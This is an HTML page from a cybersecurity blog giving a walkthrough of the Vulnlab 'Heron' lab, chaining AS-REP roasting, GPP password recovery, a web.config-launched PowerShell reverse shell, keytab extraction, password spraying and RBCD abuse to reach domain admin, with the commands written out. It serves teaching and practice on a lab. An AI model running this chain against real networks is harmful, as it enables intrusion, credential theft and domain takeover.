@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Initial AccessFrom the wiki, we obtain initial credentials: 1pentest:Heron123!  Port scan reveals: 12PORT   STATE SERVICE22&#x2F;tcp open  ssh  Network Pivoting with Ligolo-NGSetting up the tunnel on your">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Heron">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/04/15/VL-Heron/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Initial AccessFrom the wiki, we obtain initial credentials: 1pentest:Heron123!  Port scan reveals: 12PORT   STATE SERVICE22&#x2F;tcp open  ssh  Network Pivoting with Ligolo-NGSetting up the tunnel on your">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/psooibe_users.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/kerberute.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/23hash_formta.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/crackee_pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/shares_sam.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/gpp_password.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/new_account.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/shell.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/bloodhoudnpath.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/sshscript.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/ssh_root_pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/full_sudo.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/linux_machine_hash.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/pass_spray.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/jul_homedir.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Heron/rbcd.png">
+<meta property="article:published_time" content="2025-04-15T16:38:31.000Z">
+<meta property="article:modified_time" content="2025-04-15T13:41:13.693Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta property="article:tag" content="Chain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Heron/psooibe_users.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Heron</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/13/VL-Trusted/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/15/VL-Heron/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&text=VL-Heron"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&is_video=false&description=VL-Heron"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Heron&body=Check out this article: https://panosoikogr.github.io/2025/04/15/VL-Heron/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&name=VL-Heron&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/15/VL-Heron/&t=VL-Heron"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">1.</span> <span class="toc-text">Initial Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Pivoting-with-Ligolo-NG"><span class="toc-number">2.</span> <span class="toc-text">Network Pivoting with Ligolo-NG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Enumeration"><span class="toc-number">3.</span> <span class="toc-text">Web Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration-and-Authentication"><span class="toc-number">4.</span> <span class="toc-text">User Enumeration and Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">5.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Application-Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Web Application Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">7.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Hunting-as-svc-web-accounting"><span class="toc-number">8.</span> <span class="toc-text">Credential Hunting as svc-web-accounting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-via-Linux-Machine"><span class="toc-number">9.</span> <span class="toc-text">Lateral Movement via Linux Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Admin-Privilege-Escalation"><span class="toc-number">10.</span> <span class="toc-text">Domain Admin Privilege Escalation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Heron
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-15T16:38:31.000Z" class="dt-published" itemprop="datePublished">2025-04-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>From the wiki, we obtain initial credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pentest:Heron123!</span><br></pre></td></tr></table></figure>
+
+<p>Port scan reveals:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br></pre></td></tr></table></figure>
+
+<h2 id="Network-Pivoting-with-Ligolo-NG"><a href="#Network-Pivoting-with-Ligolo-NG" class="headerlink" title="Network Pivoting with Ligolo-NG"></a>Network Pivoting with Ligolo-NG</h2><p>Setting up the tunnel on your attack machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user &#123;USER&#125; mode tun ligolo</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set ligolo up</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface_create --name &quot;evil-cha&quot;</span><br></pre></td></tr></table></figure>
+<p>On the Linux target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -connect 10.8.5.195:11601 --ignore-cert</span><br></pre></td></tr></table></figure>
+<p>After connecting, select the session using the <code>session</code> command:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tunnel_start --tun evil-cha</span><br></pre></td></tr></table></figure>
+<p>This will add a route only for the Windows machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface_add_route --name evil-cha --route HERE/32</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>Port 80 is open, and we discover several users from the Linux machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc-web-accounting-d@heron.vl  svc-web-accounting@heron.vl</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/psooibe_users.png" alt="User list from Linux machine"><br>Additional users found:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wayne.wood@heron.vl</span><br><span class="line">julian.pratt@heron.vl</span><br><span class="line">samuel.davies@heron.vl</span><br></pre></td></tr></table></figure>
+
+<h2 id="User-Enumeration-and-Authentication"><a href="#User-Enumeration-and-Authentication" class="headerlink" title="User Enumeration and Authentication"></a>User Enumeration and Authentication</h2><p>We use kerbrute to verify if the discovered users are valid:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum -d heron.vl --dc 10.10.232.133 ~/Downloads/usernames.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/kerberute.png" alt="Kerbrute output"><br>It returned hashes in the <code>$18$</code> format, but hashcat uses the <code>$23$</code> format. We’ll use Impacket’s GetNPUsers to get the correct format:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile ~/Downloads/usernames.txt -dc-ip &quot;10.10.232.133&quot; &quot;heron.vl&quot;/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/23hash_formta.png" alt="Hashcat format conversion"><br>Cracking the hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash223.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/crackee_pass.png" alt="Cracked password"><br>Credentials obtained:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samuel.davies : &lt;PASS&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>Enumerating SMB shares with the compromised user:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;samuel.davies&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/shares_sam.png" alt="SMB shares for Samuel"><br>Found GPP password:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;samuel.davies&#x27; -p &#x27;&#x27; -M gpp_password</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/gpp_password.png" alt="GPP password extraction"><br>Testing credentials against SMB:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u usernames.txt -p &#x27;&lt;PASS&gt;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/new_account.png" alt="New account discovered"><br>New credentials discovered:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc-web-accounting-d:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>
+<p>Enumerating SMB shares with the new user:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;svc-web-accounting-d&#x27; -p &#x27;&lt;PASS&gt;&#x27; --shares</span><br></pre></td></tr></table></figure>
+<p>We find we have <code>accounting$ READ,WRITE</code> privileges. Within this share, we locate a web.config file:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> <span class="attr">inheritInChildApplications</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;aspNetCore&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aspNetCore</span> <span class="attr">processPath</span>=<span class="string">&quot;dotnet&quot;</span> <span class="attr">arguments</span>=<span class="string">&quot;.\AccountingApp.dll&quot;</span> <span class="attr">stdoutLogEnabled</span>=<span class="string">&quot;false&quot;</span> <span class="attr">stdoutLogFile</span>=<span class="string">&quot;.\logs\stdout&quot;</span> <span class="attr">hostingModel</span>=<span class="string">&quot;inprocess&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-Application-Exploitation"><a href="#Web-Application-Exploitation" class="headerlink" title="Web Application Exploitation"></a>Web Application Exploitation</h2><p>First, we add the accounting vhost to our machine and log in to <code>http://accounting.heron.vl/</code> using <code>svc-web-accounting-d</code>. We don’t find any useful information, but discover a potential new user: <code>rhys.george@heron.vl</code>.<br>For our reverse shell, I recommend using the PowerShell #3 Base64 payload from <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells</a>.<br>We modify the web.config file:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> <span class="attr">inheritInChildApplications</span>=<span class="string">&quot;false&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;aspNetCore&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">aspNetCore</span> <span class="attr">processPath</span>=<span class="string">&quot;powershell&quot;</span> <span class="attr">arguments</span>=<span class="string">&quot;-e (BASE64 PAYLOAD)&quot;</span> <span class="attr">hostingModel</span>=<span class="string">&quot;OutOfProcess&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">location</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Then we create a hoaxshell and paste the base64 output in the arguments:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del web.config</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put web.config</span><br></pre></td></tr></table></figure>
+<p>This gives us a shell as <code>svc-web-accounting</code> (set the shell to be on the jumpbox machine and not your attack machine).<br>A good idea is to use Sliver so you can use your tools to connect to the domain controller.<br>Ligolo setup:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444</span><br></pre></td></tr></table></figure>
+<p>The shell should point at the Linux machine and address 1234, with the listener on our machine on port 4444:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+<p>After setting everything up, refresh the page:<br><img src="/images/Heron/shell.png" alt="Shell established"></p>
+<h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.232.133 -u &#x27;svc-web-accounting-d&#x27; -p &#x27;&lt;PASS&gt;&#x27; --bloodhound --dns-server 10.10.232.133 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/bloodhoudnpath.png" alt="BloodHound attack path"></p>
+<h2 id="Credential-Hunting-as-svc-web-accounting"><a href="#Credential-Hunting-as-svc-web-accounting" class="headerlink" title="Credential Hunting as svc-web-accounting"></a>Credential Hunting as svc-web-accounting</h2><p><img src="/images/Heron/sshscript.png" alt="SSH script discovery"><br>Inside the ssh.ps1 file, we find:<br><img src="/images/Heron/ssh_root_pass.png" alt="SSH root password"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$plinkPath = &quot;C:\Program Files\PuTTY\plink.exe&quot;</span><br><span class="line">$targetMachine = &quot;frajmp&quot;</span><br><span class="line">$user = &quot;_local&quot;</span><br><span class="line">$password = &quot;&lt;PASS&gt;&quot;</span><br><span class="line">&amp; &quot;$plinkPath&quot; -ssh -batch $user@$targetMachine -pw $password &quot;ps auxf; ls -lah /home; exit&quot;</span><br></pre></td></tr></table></figure>
+<p>With this new user, we have full sudo access:<br><img src="/images/Heron/full_sudo.png" alt="Full sudo access"></p>
+<h2 id="Lateral-Movement-via-Linux-Machine"><a href="#Lateral-Movement-via-Linux-Machine" class="headerlink" title="Lateral Movement via Linux Machine"></a>Lateral Movement via Linux Machine</h2><p>As this Linux machine is domain-joined, we can extract <code>krb5.keytab</code>, which contains secrets about the machine account. We use <a target="_blank" rel="noopener" href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> to extract those secrets:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 keytabextract.py /etc/krb5.keytab</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/linux_machine_hash.png" alt="Linux machine hash extraction"><br>After password spraying, we get a hit on <code>julian.pratt</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.202.197 -u usernames.txt -p &#x27;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/pass_spray.png" alt="Password spray results"><br>We gain access to his home directory:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.202.197/home$ -U julian.pratt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Heron/jul_homedir.png" alt="Julian&#39;s home directory"><br>After retrieving <code>mucjmp.lnk</code> to our local machine and examining it (just run <code>cat mucjmp.lnk</code> and there should be a cleartext string with the autologin credentials), we find credentials for <code>adm_prju</code>:<br><code>adm_prju@mucjmp -pw &lt;PASS&gt;</code></p>
+<h2 id="Domain-Admin-Privilege-Escalation"><a href="#Domain-Admin-Privilege-Escalation" class="headerlink" title="Domain Admin Privilege Escalation"></a>Domain Admin Privilege Escalation</h2><p>From our BloodHound enumeration, we discovered that <code>adm_prju</code> is in the Admins_T1 group, which has <code>WriteAccountRestrictions</code> over the DC. To exploit this, we need a machine account. Fortunately, we have compromised the Linux machine account.<br>Now we can abuse Resource-Based Constrained Delegation (RBCD):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-rbcd -delegate-from &#x27;FRAJMP$&#x27; -delegate-to &#x27;MUCDC$&#x27; -action &#x27;write&#x27; &#x27;heron.vl/adm_prju:&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Heron/rbcd.png" alt="RBCD exploitation"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn &#x27;cifs/mucdc.heron.vl&#x27; -impersonate &#x27;_admin&#x27; &#x27;heron.vl/FRAJMP$&#x27; -hashes :&lt;HASH&gt;</span><br></pre></td></tr></table></figure>
+<p>Now we can attempt to dump all secrets through our SOCKS proxy using Impacket’s secretsdump command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy, so be patient:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k mucdc.heron.vl</span><br></pre></td></tr></table></figure>
+<p>We tried using WinRM, but it’s disabled, so we’ll use psexec instead:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec heron.vl/&#x27;_admin&#x27;@heron.vl -hashes :&lt;HASH&gt;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=395c9eb2-2c08-4675-9b0e-3bf0bb3c4c44">https://api.vulnlab.com/api/v1/share?id=395c9eb2-2c08-4675-9b0e-3bf0bb3c4c44</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
